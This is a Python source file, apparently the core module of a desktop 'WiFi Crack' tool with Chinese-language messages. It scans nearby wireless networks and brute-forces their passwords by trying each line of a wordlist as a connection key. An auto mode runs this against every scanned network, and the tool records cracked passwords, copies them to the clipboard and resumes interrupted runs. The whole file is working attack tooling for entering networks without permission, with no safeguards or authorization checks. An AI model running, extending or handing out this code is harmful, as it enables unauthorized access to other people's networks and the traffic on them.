# -*- coding: utf-8 -*-
"""
WiFi Crack - Core cracking functionality
"""
import time
import platform
from itertools import islice
from typing import TYPE_CHECKING, Optional, Dict, List, Union

import pyperclip
from pywifi import const, PyWiFi, Profile
from pywifi.iface import Interface

from .constants import Colors, Messages, Defaults
from .logger import get_logger

if TYPE_CHECKING:
    from .wifi_tool import WifiCrackTool


class Crack:
    """WiFi password cracking class"""
    
    def __init__(self, tool: 'WifiCrackTool'):
        """
        Initialize Crack instance
        
        :param tool: WifiCrackTool instance
        """
        self.tool = tool
        self.win = tool.win
        self.ui = tool.ui
        self.logger = get_logger()
        
        # WiFi interface
        self.wifi = PyWiFi()
        self.wnics = self.wifi.interfaces()
        self.iface: Optional[Interface] = None
        
        # WiFi data
        self.ssids: List[str] = []
        self.profile_dict: Dict[str, Profile] = {}
        
        # State
        self.convert_success = False
        self.is_auto = False
        self.current_ssid: str = ""
        self.current_position: int = 0
        
        # Initialize wireless adapter
        self._init_wnic()
    
    def _init_wnic(self) -> None:
        """Initialize wireless network adapter"""
        try:
            if len(self.wnics) > 0:
                self.tool.show_msg(Messages.WNIC_FOUND.format(count=len(self.wnics)))
                for i, wnic in enumerate(self.wnics):
                    self.ui.cbo_wnic.addItem(wnic.name(), i)
                self.ui.cbo_wnic.setEnabled(True)
                self.ui.btn_refresh_wifi.setEnabled(True)
            else:
                self.win.showwarning(
                    title='警告',
                    message='无法获取到无线网卡！\n请确保你的电脑拥有无线网卡再继续使用。'
                )
                self.tool.show_msg('无法获取到无线网卡！\n请确保你的电脑拥有无线网卡才可继续使用。\n\n')
        except Exception as e:
            self.logger.error(f"获取无线网卡时发生错误: {e}")
            self.win.showerror(title='错误警告', message=f'获取无线网卡时发生未知错误 {e}')
            self.tool.show_msg(f"[错误]获取无线网卡时发生未知错误 {e}\n\n", Colors.RED)
            self.tool.reset_controls_state()
    
    def search_wifi(self) -> None:
        """Scan for nearby WiFi networks"""
        try:
            # Validate wireless adapter
            if not self.wnics or len(self.wnics) == 0:
                self.win.show_warning.send('警告', Messages.NO_WNIC_FOUND)
                self.win.show_msg.send(f"[警告]{Messages.NO_WNIC_FOUND}\n\n", Colors.ORANGE)
                self.win.reset_controls_state.send()
                return
            
            wnic_index = self.ui.cbo_wnic.currentData()
            if wnic_index is None or wnic_index >= len(self.wnics) or wnic_index < 0:
                self.win.show_warning.send('警告', '选择的无线网卡无效！')
                self.win.show_msg.send("[警告]选择的无线网卡无效！\n\n", Colors.ORANGE)
                self.win.reset_controls_state.send()
                return
            
            self.iface = self.wnics[wnic_index]
            name = self.iface.name()
            
            # Check adapter status
            try:
                iface_status = self.iface.status()
                self.win.show_msg.send(f"网卡状态: {iface_status}\n", Colors.BLUE)
                
                valid_statuses = [
                    const.IFACE_DISCONNECTED, 
                    const.IFACE_INACTIVE, 
                    const.IFACE_SCANNING, 
                    const.IFACE_CONNECTED
                ]
                if iface_status not in valid_statuses:
                    self.win.show_warning.send(
                        '警告',
                        f'网卡状态异常！当前状态: {iface_status}\n请检查WLAN是否已打开。'
                    )
                    self.win.show_msg.send(
                        f"[警告]网卡状态异常！当前状态: {iface_status}\n请检查WLAN是否已打开。\n\n",
                        Colors.ORANGE
                    )
                    self.win.reset_controls_state.send()
                    return
            except Exception as e:
                self.win.show_warning.send('警告', f'无法获取网卡状态！\n错误: {e}\n请检查WLAN是否已打开。')
                self.win.show_msg.send(f"[警告]无法获取网卡状态！错误: {e}\n\n", Colors.ORANGE)
                self.win.reset_controls_state.send()
                return
            
            # Start scanning
            try:
                self.iface.scan()
                self.win.show_msg.send(Messages.SCANNING_WIFI.format(name=name), Colors.BLACK)
            except Exception as e:
                self.win.show_warning.send(
                    '警告',
                    f'启动WiFi扫描失败！\n\n错误: {type(e).__name__}: {e}\n\n'
                    '可能原因：\n1. WLAN服务未启动\n2. 网卡驱动问题\n3. WiFi功能被禁用'
                )
                self.win.show_msg.send(f"[警告]启动WiFi扫描失败！错误: {e}\n\n", Colors.ORANGE)
                self.win.reset_controls_state.send()
                return
            
            # Wait for scan
            time.sleep(self.tool.config.scan_time)
            
            # Get scan results
            try:
                ap_list = self.iface.scan_results()
                
                if ap_list is None:
                    self.win.show_warning.send(
                        '警告',
                        '扫描结果为空（None）！\n\n请尝试：\n1. 关闭WiFi后重新打开\n2. 重启WLAN AutoConfig服务'
                    )
                    self.win.show_msg.send("[警告]扫描结果为空！请检查WLAN服务状态。\n\n", Colors.ORANGE)
                    self.win.reset_controls_state.send()
                    return
            except Exception as e:
                self.win.show_warning.send('警告', f'获取扫描结果失败！\n错误: {e}')
                self.win.show_msg.send(f"[警告]获取扫描结果失败！错误: {e}\n\n", Colors.ORANGE)
                self.win.reset_controls_state.send()
                return
            
            # Remove duplicates
            ap_dict_tmp = {}
            for ap in ap_list:
                if ap.ssid.strip():
                    ap_dict_tmp[ap.ssid] = ap
            
            ap_list = list(ap_dict_tmp.values())
            
            self.win.show_msg.send(Messages.SCAN_COMPLETE, Colors.BLACK)
            
            # Build profile dictionary
            self.ssids = []
            self.profile_dict = {}
            
            for i, data in enumerate(ap_list):
                ssid = data.ssid
                self.ssids.append(ssid)
                
                profile = Profile()
                profile.ssid = data.ssid
                profile.auth = data.auth
                profile.akm = data.akm
                profile.cipher = data.cipher
                self.profile_dict[data.ssid] = profile
            
            self.win.reset_controls_state.send()
            self.win.add_wifi_items.send(self.ssids)
            
            if self.ssids:
                self.win.set_wifi_current_index.send(0)
                
        except Exception as e:
            error_type = type(e).__name__
            error_msg = str(e)
            
            self.logger.error(f"扫描wifi时发生错误: {error_type}: {error_msg}")
            self.win.show_msg.send(f"[调试]异常类型: {error_type}, 异常信息: {error_msg}\n", Colors.BLUE)
            
            if "NULL pointer access" in error_msg or "NoneType" in error_msg or error_type == "OSError":
                self.win.show_warning.send(
                    '警告',
                    f'你当前设备的WLAN未打开或无线网卡不可用！\n\n详细信息: {error_type}: {error_msg}'
                )
                self.win.show_msg.send("[警告]你当前设备的WLAN未打开或无线网卡不可用！\n\n", Colors.ORANGE)
            else:
                self.win.show_error.send('错误警告', f'扫描wifi时发生未知错误\n\n{error_type}: {error_msg}')
                self.win.show_msg.send(f"[错误]扫描wifi时发生未知错误 ({error_type}): {error_msg}\n\n", Colors.RED)
            
            self.win.reset_controls_state.send()
    
    def auto_crack(self, start_position: int = 0) -> Optional[bool]:
        """
        Auto crack all scanned WiFi networks
        
        :param start_position: Resume position (-1 for unified resume handling)
        :return: False on error, None otherwise
        """
        try:
            self.is_auto = True
            self.win.show_msg.send(Messages.AUTO_CRACK_START, Colors.BLUE)
            
            # Get already cracked SSIDs
            cracked_ssids = [item['ssid'] for item in self.tool.config.pwd_dict_data]
            uncracked_ssids = [ssid for ssid in self.ssids if ssid not in cracked_ssids]
            
            if not uncracked_ssids:
                self.win.show_msg.send(Messages.ALL_CRACKED, Colors.GREEN)
                self.win.show_info.send('自动破解', Messages.ALL_CRACKED.strip())
                self.is_auto = False
                self.win.reset_controls_state.send()
                return
            
            # Display pending WiFis
            wifi_info = "待破解WiFi列表：\n"
            for i, ssid in enumerate(uncracked_ssids, 1):
                wifi_info += f"{'&nbsp;' * 40}({i}){'&nbsp;' * 10}{ssid}\n"
            self.win.show_msg.send(wifi_info, Colors.BLUE)
            
            pwds = {}
            colors = {}
            
            for ssid in uncracked_ssids:
                if start_position == -1:
                    # Use unified resume handling
                    resume_info = self.tool.config.resume_info
                    pwd_file = self.tool.config.pwd_txt_path
                    
                    if (not self.tool.pwd_file_changed and 
                        ssid in resume_info and 
                        resume_info[ssid]['pwd_file'] == pwd_file):
                        start_pos = resume_info[ssid]['position']
                    else:
                        start_pos = 0
                    pwd = self.crack(ssid, start_pos)
                else:
                    pwd = self._crack_single_wifi(ssid)
                
                if isinstance(pwd, str):
                    pwds[ssid] = pwd
                    colors[ssid] = Colors.GREEN
                else:
                    pwds[ssid] = "破解失败"
                    colors[ssid] = Colors.RED
            
            self.win.show_msg.send(Messages.AUTO_CRACK_COMPLETE, Colors.BLUE)
            
            # Display results
            crack_result_info = "结果如下：\n"
            for i, ssid in enumerate(uncracked_ssids, 1):
                crack_result_info += (
                    f"<span style='color:{colors[ssid]}'>"
                    f"{'&nbsp;' * 40}({i}){'&nbsp;' * 10}{ssid}{'&nbsp;' * 10}{pwds[ssid]}"
                    f"</span>\n"
                )
            
            self.win.show_msg.send(crack_result_info, Colors.BLUE)
            self.win.show_info.send('自动破解', "自动破解已完成！破解结果已记录到日志中")
            
            self.is_auto = False
            self.win.reset_controls_state.send()
            
        except Exception as e:
            self.logger.error(f"自动破解过程中发生错误: {e}")
            self.win.show_error.send('错误警告', f'自动破解过程中发生未知错误 {e}')
            self.win.show_msg.send(f"[错误]自动破解过程中发生未知错误 {e}\n\n", Colors.RED)
            self.is_auto = False
            self.win.reset_controls_state.send()
            return False
    
    def _crack_single_wifi(self, ssid: str) -> Union[str, bool]:
        """
        Crack single WiFi with resume support
        
        :param ssid: WiFi SSID
        :return: Password string on success, False on failure
        """
        resume_info = self.tool.config.resume_info
        pwd_file = self.tool.config.pwd_txt_path
        
        start_position = 0
        if (not self.tool.pwd_file_changed and 
            ssid in resume_info and 
            resume_info[ssid]['pwd_file'] == pwd_file):
            start_position = resume_info[ssid]['position']
        
        return self.crack(ssid, start_position)
    
    def crack(self, ssid: str, start_position: int = 0) -> Union[str, bool]:
        """
        Crack WiFi password
        
        :param ssid: WiFi SSID
        :param start_position: Starting position for resume
        :return: Password string on success, False on failure
        """
        try:
            self.current_ssid = ssid
            
            # Check password dictionary first
            pwd_dict_data = self.tool.config.pwd_dict_data
            if pwd_dict_data:
                matching_entries = [entry for entry in pwd_dict_data if entry['ssid'] == ssid]
                
                if matching_entries:
                    self.win.show_msg.send(
                        f"在密码字典中发现已破解的WiFi [{ssid}]，尝试连接...\n\n",
                        Colors.GREEN
                    )
                    
                    for i, entry in enumerate(matching_entries, 1):
                        if not self.tool.run:
                            self.win.show_msg.send(Messages.CRACK_TERMINATED, Colors.RED)
                            self.win.reset_controls_state.send()
                            return False
                        
                        pwd = entry['pwd']
                        result = self._connect(ssid, pwd, 'json', i)
                        
                        if result and not self.is_auto:
                            self.win.show_info.send(
                                '破解成功',
                                f"使用字典中的密码连接成功，密码：{pwd}\n(已复制到剪切板)"
                            )
                            self.win.reset_controls_state.send()
                            return True
                        elif result:
                            return pwd
                    
                    self.win.show_msg.send(
                        f"已尝试完密码字典中[{ssid}]的所有密码，均连接失败\n\n",
                        Colors.RED
                    )
            
            # Disconnect current connection
            self.iface.disconnect()
            self.win.show_msg.send(Messages.DISCONNECTING, Colors.BLACK)
            time.sleep(1)
            
            if self.iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:
                self.win.show_msg.send(Messages.DISCONNECT_SUCCESS, Colors.BLACK)
            else:
                self.win.show_msg.send(Messages.DISCONNECT_FAILED, Colors.RED)
                return False
            
            self.win.show_msg.send(f"正在准备破解WiFi[{ssid}]...\n\n", Colors.BLACK)
            self.win.show_msg.send(f"开始尝试使用密码本破解WiFi[{ssid}]...\n\n", Colors.BLACK)
            
            # Use itertools.islice for efficient file reading
            pwd_path = self.tool.config.pwd_txt_path
            
            with open(pwd_path, 'r', encoding='utf-8', errors='ignore') as f:
                # Skip to start position if resuming
                if start_position > 0:
                    self.win.show_msg.send(
                        Messages.RESUME_FROM.format(position=start_position),
                        Colors.BLUE
                    )
                    lines = islice(f, start_position - 1, None)
                    current_position = start_position - 1
                else:
                    lines = f
                    current_position = 0
                
                for line in lines:
                    current_position += 1
                    self.current_position = current_position
                    
                    # Check pause
                    with self.tool.crack_pause_condition:
                        if self.tool.paused:
                            self.win.show_msg.send(Messages.CRACK_PAUSED, Colors.ORANGE)
                            self.tool.crack_pause_condition.wait()
                    
                    # Check stop
                    if not self.tool.run:
                        self.win.show_msg.send(Messages.CRACK_TERMINATED, Colors.RED)
                        self.tool.config.save_resume_info(ssid, 'txt', pwd_path, current_position)
                        self.win.reset_controls_state.send()
                        return False
                    
                    pwd = line.strip()
                    result = self._connect(ssid, pwd, 'txt', current_position)
                    
                    if result and not self.is_auto:
                        self.win.show_info.send('破解成功', f"连接成功，密码：{pwd}\n(已复制到剪切板)")
                        self.tool.config.clear_resume_info(ssid)
                        self.win.reset_controls_state.send()
                        return True
                    elif result:
                        self.tool.config.clear_resume_info(ssid)
                        return pwd
                
                if not self.is_auto:
                    self.win.show_info.send('破解失败', Messages.CRACK_COMPLETE)
                    self.tool.config.clear_resume_info(ssid)
                    self.win.reset_controls_state.send()
            
            return False
            
        except Exception as e:
            self.logger.error(f"破解过程中发生错误: {e}")
            self.win.show_error.send('错误警告', f'破解过程中发生未知错误 {e}')
            self.win.show_msg.send(f"[错误]破解过程中发生未知错误 {e}\n\n", Colors.RED)
            self.win.reset_controls_state.send()
            return False
    
    def _connect(self, ssid: str, pwd: str, filetype: str, count: int) -> bool:
        """
        Attempt to connect to WiFi
        
        :param ssid: WiFi SSID
        :param pwd: Password to try
        :param filetype: Source type ('json' or 'txt')
        :param count: Attempt count
        :return: True on successful connection
        """
        try:
            self.iface.disconnect()
            
            # Get security type
            akm_text = self.ui.cbo_security_type.currentText()
            akm_index = self.ui.cbo_security_type.currentIndex()
            
            # Get AKM value based on platform
            akm_value = const.AKM_TYPE_NONE
            if platform.system() == "Windows":
                from pywifi import _wifiutil_win
                akm_dict = _wifiutil_win.akm_str_to_value_dict
            elif platform.system() == "Linux":
                from pywifi import _wifiutil_linux
                akm_dict = _wifiutil_linux.display_str_to_key
            else:
                akm_dict = {}
            
            if akm_text in akm_dict:
                akm_value = akm_dict[akm_text]
            
            # Create profile
            if akm_index == 0:
                # Auto mode - use scanned profile
                profile = self.profile_dict.get(ssid, Profile())
            else:
                profile = Profile()
                profile.ssid = ssid
                profile.auth = const.AUTH_ALG_OPEN
                profile.akm = akm_value
                profile.cipher = const.CIPHER_TYPE_CCMP
            
            profile.key = pwd
            
            self.iface.remove_network_profile(profile)
            temp_profile = self.iface.add_network_profile(profile)
            
            # Try connection
            max_retries = Defaults.MAX_RETRIES
            
            for _ in range(max_retries):
                self.win.show_msg.send(f"正在进行第{count}次尝试...\n", Colors.BLACK)
                self.iface.connect(temp_profile)
                
                connect_start_time = time.time()
                
                while time.time() - connect_start_time < self.tool.config.connect_time:
                    time.sleep(Defaults.CHECK_INTERVAL)
                    
                    if self.iface.status() == const.IFACE_CONNECTED:
                        self.win.show_msg.send(
                            Messages.CRACK_SUCCESS.format(pwd=pwd),
                            Colors.GREEN
                        )
                        pyperclip.copy(pwd)
                        
                        if filetype != 'json':
                            self.tool.config.save_pwd_dict(ssid, pwd)
                        
                        return True
                
                time.sleep(0.1)
            
            # Connection failed
            self.win.show_msg.send(Messages.CRACK_FAILED.format(pwd=pwd), Colors.RED)
            self.iface.remove_network_profile(profile)
            return False
            
        except Exception as e:
            self.logger.error(f"连接wifi过程中发生错误: {e}")
            self.win.show_error.send('错误警告', f'连接wifi过程中发生未知错误 {e}')
            self.win.show_msg.send(f"[错误]连接wifi过程中发生未知错误 {e}\n\n", Colors.RED)
            self.win.reset_controls_state.send()
            return False
